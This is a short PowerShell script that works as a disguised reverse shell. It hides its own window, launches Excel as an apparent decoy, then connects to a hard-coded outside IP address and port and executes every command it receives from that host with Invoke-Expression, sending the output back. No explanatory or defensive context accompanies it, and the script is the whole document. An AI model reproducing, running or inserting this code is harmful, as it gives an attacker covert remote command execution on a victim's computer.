Add-Type -Name win -MemberDefinition ‘[DllImport(“user32.dll”)] public static extern bool ShowWindow(int handle, int state);’ -Namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle,0)
Invoke-Item “C:\Program Files\Microsoft Office\Office15\excel.exe”
Set-Location c:\windows\system32
$client = New-Object System.Net.Sockets.TCPClient(“77.76.45.142”,61080);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + “PS ” + (pwd).Path + “> “;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
